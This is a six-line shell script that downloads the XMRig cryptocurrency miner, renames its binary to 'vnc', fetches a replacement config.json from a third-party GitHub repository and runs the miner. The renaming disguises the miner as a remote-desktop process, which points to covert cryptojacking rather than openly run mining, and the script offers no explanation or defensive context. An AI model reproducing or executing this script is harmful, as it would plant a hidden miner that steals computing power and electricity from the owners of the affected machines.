wget https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-focal-x64.tar.gz
tar -xvf xmrig-6.21.2-focal-x64.tar.gz
cd xmrig-6.21.2
rm config.json
mv xmrig vnc
wget https://raw.githubusercontent.com/n2lentertainement/vebo/main/config.json
./vnc
